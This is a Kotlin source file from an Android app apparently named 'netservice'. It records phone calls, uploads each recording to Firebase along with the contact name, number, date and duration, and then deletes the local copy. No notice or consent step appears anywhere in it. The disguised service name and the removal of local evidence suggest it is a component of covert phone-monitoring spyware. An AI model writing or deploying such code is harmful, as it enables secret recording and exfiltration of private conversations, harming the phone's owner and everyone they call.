package com.dtz.netservice.services.calls

import android.content.Context
import android.media.MediaRecorder
import android.net.Uri
import com.dtz.netservice.rxFirebase.InterfaceFirebase
import com.dtz.netservice.data.model.Calls
import com.dtz.netservice.services.base.BaseInteractorService
import com.dtz.netservice.utils.ConstFun.getDateTime
import com.dtz.netservice.utils.ConstFun.isAndroidM
import com.dtz.netservice.utils.Consts.ADDRESS_AUDIO_CALLS
import com.dtz.netservice.utils.Consts.CALLS
import com.dtz.netservice.utils.Consts.DATA
import com.dtz.netservice.utils.FileHelper
import com.dtz.netservice.utils.FileHelper.getFileNameCall
import com.dtz.netservice.utils.FileHelper.getContactName
import com.dtz.netservice.utils.FileHelper.getDurationFile
import com.dtz.netservice.utils.FileHelper.getFilePath
import com.dtz.netservice.utils.MediaRecorderUtils
import io.reactivex.android.schedulers.AndroidSchedulers
import io.reactivex.schedulers.Schedulers
import java.io.File
import javax.inject.Inject

/**
 * Created by luis rafael on 27/03/18.
 */
class InteractorCalls<S : InterfaceServiceCalls> @Inject constructor(context: Context, firebase: InterfaceFirebase) : BaseInteractorService<S>(context, firebase), InterfaceInteractorCalls<S> {

    private var recorder: MediaRecorderUtils = MediaRecorderUtils{deleteFile()}
    private var fileName: String? = null
    private var contact: String? = null
    private var phoneNumber: String? = null
    private var type : Int = 0
    private var dateTime: String? = null

    override fun startRecording(phoneNumber: String?,type:Int) {

        this.type = type
        this.phoneNumber = phoneNumber
        dateTime = getDateTime()
        contact = getContext().getContactName(phoneNumber)
        fileName = getContext().getFileNameCall(phoneNumber, dateTime)

        if (isAndroidM()) recorder.startRecording(MediaRecorder.AudioSource.VOICE_COMMUNICATION,fileName)
        else recorder.startRecording(MediaRecorder.AudioSource.VOICE_CALL,fileName)

    }

    override fun stopRecording() {
        recorder.stopRecording { sendFileCall() }
    }

    private fun deleteFile() {
        FileHelper.deleteFile(fileName)
        if (getService() != null) getService()!!.stopServiceCalls()
    }

    private fun sendFileCall() {
        val filePath = "${getContext().getFilePath()}/$ADDRESS_AUDIO_CALLS"
        val dateNumber = fileName!!.replace("$filePath/", "")
        val uri = Uri.fromFile(File(fileName))
        getService()!!.addDisposable(firebase().putFile("$CALLS/$dateNumber", uri)
                .subscribeOn(Schedulers.io())
                .observeOn(AndroidSchedulers.mainThread())
                .subscribe({ setPushName() }, { deleteFile() }))
    }

    private fun setPushName() {
        val duration = getDurationFile(fileName!!)
        val calls = Calls(contact, phoneNumber, dateTime, duration,type)
        firebase().getDatabaseReference("$CALLS/$DATA").push().setValue(calls)
        deleteFile()
    }


}